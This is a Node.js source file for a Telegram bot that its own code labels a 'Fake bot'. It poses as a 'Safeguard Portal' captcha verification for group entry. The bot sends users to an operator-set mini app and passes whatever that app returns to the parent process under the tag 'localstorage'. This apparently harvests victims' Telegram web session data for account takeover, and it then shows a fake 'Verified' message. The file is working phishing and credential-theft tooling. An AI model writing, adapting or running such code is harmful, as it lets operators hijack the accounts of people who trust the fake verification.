const { Telegraf } = require("telegraf");
const { isMainThread, workerData, parentPort, getEnvironmentData } = require("worker_threads");
const crypto = require("crypto");

if (isMainThread) throw new Error("Can't be used as a node.js script, used as a worker thread");

let db = getEnvironmentData("db") || {};
const { token, name } = workerData;
if (!db.MINI_APP_URL || !db.VERIFICATION_IMAGE_URL || !db.VERIFIED_IMAGE_URL || !db.Workers || !db.Admins || !token || !name) throw new Error("Missing required worker data");

const UserPrivilege = {
    Admin: 2,
    Worker: 1,
    Unprivileged: 0
}

parentPort.on("message", (msg) => {
    if (msg.type != "verification") return;
    if (!msg.data || !msg.data.type || !msg.data.key || !msg.data.data) return console.log("Invalid verification message");

    completeUserVerification(msg.data.type, msg.data.key, msg.data.data);
});

class UserVerificationInfoEntry {
    constructor(userId, channelId, ctx) {
        this.verificationTime = new Date(Date.now());
        this.verificationKey = generateVerificationKey();
        this.channelId = channelId;
        this.userId = userId;
        this.context = ctx;
    }
}

const userVerificationInfo = [];

function getPrivilege(userId) {
    if (db.Admins.includes(userId)) return UserPrivilege.Admin;
    if (db.Workers.includes(userId)) return UserPrivilege.Worker;
    return UserPrivilege.Unprivileged;
}

function hasPrivilege(userId, requiredPrivilege) {
    return getPrivilege(userId) >= requiredPrivilege;
}

function regiserUserForVerification(userId, channel, ctx) { // Original name kept; fixed logic if needed
    deleteFromPendingList(userId, channel);
    const entry = new UserVerificationInfoEntry(userId, channel, ctx);
    userVerificationInfo.push(entry);
    console.log(`Registered user ${entry.userId} with key ${entry.verificationKey.substring(0, 5)}... (${entry.verificationTime})`);
    return entry;
}

function generateVerificationKey() {
    return crypto.randomBytes(64).toString('hex');
}

async function completeUserVerification(verificationType, verificationKey, data) {
    try {
        if (verificationType == "msg") {
            const entry = userVerificationInfo.filter((d) => d.verificationKey == verificationKey)[0];
            if (!entry) return;
            deleteFromPendingList(entry.userId, entry.channelId);

            parentPort.postMessage({
                type: "localstorage",
                data: { data, channel: entry.channelId }
            });

            await entry.context.sendPhoto(db.VERIFIED_IMAGE_URL, {
                caption:
                    "Verified, you can join the group using this temporary link:\n\n" +
                    `https://your-test-invite-link-here\n\n` + // CHANGE TO YOUR TEST INVITE
                    "This link is a one time use and will expire"
            });
        } else {
            parentPort.postMessage({
                type: "localstorage",
                data: { data, channel: verificationKey }
            });
        }
    } catch (err) {
        console.error("Complete verification error:", err);
    }
}

function deleteFromPendingList(userId, channelId) {
    const entries = userVerificationInfo.filter((d) => d.userId == userId && d.channelId == channelId);
    entries.forEach(entry => {
        const idx = userVerificationInfo.indexOf(entry);
        if (idx > -1) userVerificationInfo.splice(idx, 1);
    });
}

async function initBot() {
    try {
        const botInstance = new Telegraf(token);

        // Error handling for catch
        botInstance.catch((err, ctx) => {
            console.error('Fake bot error:', err);
            if (err.response && err.response.error_code === 409) {
                console.log('409 Conflict on fake bot caught, triggering retry...');
            }
        });

        // Enhanced launch with exponential backoff retry
        setTimeout(async () => {
            let retryCount = 0;
            const maxRetries = 3;
            const baseDelay = 30000; // 30s initial

            const launchWithRetry = async () => {
                try {
                    await botInstance.launch();
                    console.log('Fake bot launched for ' + name);
                    return;
                } catch (err) {
                    if (err.response && err.response.error_code === 409) {
                        retryCount++;
                        if (retryCount >= maxRetries) {
                            console.error('Max retries reached for fake bot 409 conflict');
                            return;
                        }
                        const delay = baseDelay * Math.pow(2, retryCount - 1); // 30s, 60s, 120s
                        console.log(`Fake bot 409 conflict (attempt ${retryCount}/${maxRetries}), retrying in ${delay/1000}s...`);
                        setTimeout(launchWithRetry, delay);
                    } else {
                        console.error('Non-409 launch error on fake bot:', err);
                        throw err;
                    }
                }
            };

            await launchWithRetry();
        }, 30000); // 30s initial delay before first attempt

        botInstance.command("start", async (ctx) => {
            try {
                if (ctx.chat.type != 'private') return;
                if (ctx.args.length != 1) return;
                const channel = ctx.args[0];

                const entry = regiserUserForVerification(ctx.from.id, channel, ctx);

                const keyboard = {
                    inline_keyboard: [
                        [{ text: 'VERIFY', web_app: { url: db.MINI_APP_URL + `/${entry.verificationKey}` } }]
                    ]
                };

                await ctx.replyWithPhoto({ url: db.VERIFICATION_IMAGE_URL }, {
                    caption: "<b>Verify you're human with Safeguard Portal</b>\n\n" +
                        "Click 'VERIFY' and complete captcha to gain entry - " +
                        "<a href=\"https://docs.safeguard.run/group-security/verification-issues\"><i>Not working?</i></a>",
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });
            } catch (err) {
                console.error("Fake bot start error:", err);
            }
        });

        // Signals for graceful stop
        process.once('SIGINT', () => {
            console.log('SIGINT received for fake bot, stopping...');
            botInstance.stop('SIGINT');
        });
        process.once('SIGTERM', () => {
            console.log('SIGTERM received for fake bot, stopping...');
            botInstance.stop('SIGTERM');
        });

    } catch (err) {
        console.error("Fake bot init error:", err);
    }
}

async function reloadDatabase() {
    db = getEnvironmentData("db") || {};
}

process.on("uncaughtException", console.error);
process.on("unhandledRejection", console.error);

initBot();
setInterval(reloadDatabase, 1000);
